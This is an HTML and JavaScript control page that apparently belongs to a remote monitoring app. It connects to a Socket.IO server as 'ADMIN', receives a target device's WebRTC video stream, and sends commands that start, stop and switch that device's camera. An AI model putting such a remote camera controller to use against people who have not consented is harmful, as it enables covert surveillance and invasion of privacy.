<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Live Screen Preview</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
}

body{
    background:#000;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.phone{
    width:100%;
    max-width:430px;
    height:100vh;
    background:#000;
    display:flex;
    flex-direction:column;
}

/* HEADER */
.header{
    height:55px;
    background:rgba(0,0,0,.7);
    color:white;
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:0 16px;
    border-bottom:1px solid rgba(255,255,255,.1);
}

.live{
    background:#00ff9c;
    color:#000;
    padding:4px 14px;
    border-radius:20px;
    font-size:12px;
    font-weight:700;
    display:none;
}

/* VIDEO */
.viewer{
    flex:1;
    background:#000;
    display:flex;
    justify-content:center;
    align-items:center;
}

video{
    width:100%;
    height:100%;
    object-fit:contain;
    background:#000;
}

/* CONTROLS */
.controls{
    height:70px;
    background:#111;
    display:flex;
    gap:12px;
    padding:12px;
    border-top:1px solid rgba(255,255,255,.1);
}

.btn{
    flex:1;
    border:none;
    border-radius:14px;
    font-size:15px;
    font-weight:700;
    color:white;
}

.start{ background:#2ecc71; color:#000; }
.stop{ background:#e74c3c; }
.switch{ background:#3498db; max-width:70px; }
</style>
</head>

<body>

<div class="phone">

    <div class="header">
        <span>Live Screen</span>
        <div id="live" class="live">LIVE</div>
    </div>

    <div class="viewer">
        <video id="remoteVideo" autoplay playsinline muted></video>
    </div>

    <div class="controls">
        <button class="btn start" onclick="startShare()">‚ñ∂ START</button>
        <button class="btn switch" onclick="switchCamera()">üîÑ</button>
        <button class="btn stop" onclick="stopShare()">‚èπ STOP</button>
    </div>

</div>

<script>
const SERVER = "https://child-v9no.onrender.com";

const params = new URLSearchParams(window.location.search);
let DEVICE_ID = params.get("id");

if(!DEVICE_ID){
    alert("Device ID missing");
}

let socket;
let pc;
let remoteStream = new MediaStream();

const config = {
    iceServers:[{ urls:"stun:stun.l.google.com:19302" }]
};

socket = io(SERVER);

socket.on("connect", ()=>{
    socket.emit("join-room","ADMIN");
});

/* ================= OFFER ================= */

socket.on("offer", async (data)=>{

    pc = new RTCPeerConnection(config);

    remoteStream = new MediaStream();
    document.getElementById("remoteVideo").srcObject = remoteStream;

    pc.ontrack = (event)=>{
        remoteStream.addTrack(event.track);
        document.getElementById("live").style.display="block";
    };

    pc.onicecandidate = e=>{
        if(e.candidate){
            socket.emit("candidate",{
                target: DEVICE_ID,
                candidate: e.candidate.candidate,
                sdpMid: e.candidate.sdpMid,
                sdpMLineIndex: e.candidate.sdpMLineIndex
            });
        }
    };

    await pc.setRemoteDescription(
        new RTCSessionDescription({
            type: "offer",
            sdp: data.sdp
        })
    );

    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);

    socket.emit("answer",{
        target: DEVICE_ID,
        sdp: answer.sdp
    });
});

/* ================= ICE ================= */

socket.on("candidate", async d=>{
    if(pc){
        await pc.addIceCandidate(
            new RTCIceCandidate({
                candidate:d.candidate,
                sdpMid:d.sdpMid,
                sdpMLineIndex:d.sdpMLineIndex
            })
        );
    }
});

/* ================= CONTROLS ================= */

function startShare(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command:"start_video"
    });
}

function stopShare(){
    socket.emit("send-command",{
        targetId: DEVICE_ID,
        command:"stop_video"
    });

    if(pc){
        pc.close();
        pc=null;
    }

    document.getElementById("remoteVideo").srcObject = null;
    document.getElementById("live").style.display="none";
}

function switchCamera(){
    socket.emit("switch-camera",{ target: DEVICE_ID });
}
</script>

</body>
</html>
